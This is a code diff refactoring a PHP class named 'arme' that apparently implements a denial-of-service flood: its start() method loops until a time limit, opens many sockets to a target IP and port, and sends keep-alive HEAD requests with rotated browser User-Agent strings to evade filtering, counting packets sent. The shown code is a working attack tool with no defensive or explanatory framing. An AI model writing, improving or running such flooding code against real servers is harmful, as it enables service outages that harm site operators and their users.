@@ -1,11 +1,10 @@
 <?php
-include_once "../header.php";
 class arme{
-	public $ip;
-	public $port;
-	public $timedout;
-	public $socketn;
-	public $max_time;
+	private $ip;
+	private $port;
+	private $timedout;
+	private $socketn;
+	private $max_time;
 	public function __construct($ip, $port, $timedout, $socketn, $max_time) {
 		$this->ip = $ip;
 		$this->port = $port;
@@ -13,8 +12,8 @@ class arme{
 		$this->socketn = $socketn;
 		$this->max_time = $max_time;
 	}
-	public function start(){
-		$armetomb=array(
+	private function randomUserAgent(){
+		$User_Agents=array(
 		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
 		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
@@ -63,6 +62,9 @@ class arme{
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
 		"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 		"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1");
+		return $User_Agents[rand(0, sizeof($User_Agents)-1)];
+	}
+	public function start(){
 		$packet = 0;
 		while(1){
 			if(time() >= $this->max_time){
@@ -75,7 +77,7 @@ class arme{
 				$fp[$i]=fsockopen($this->ip,$this->port,$errno,$errstr,$this->timedout);
 				$out="HEAD / HTTP/1.1\r\n";
 				$out.="Host: ".$this->ip."\r\n";
-				$out.="User-Agent: ".$armetomb[$rand]."\r\n";
+				$out.="User-Agent: ".$this->randomUserAgent()."\r\n";
 				$out.= "Connection: keep-alive\r\n";
 				$out.= "\r\n";
 				$packet++;
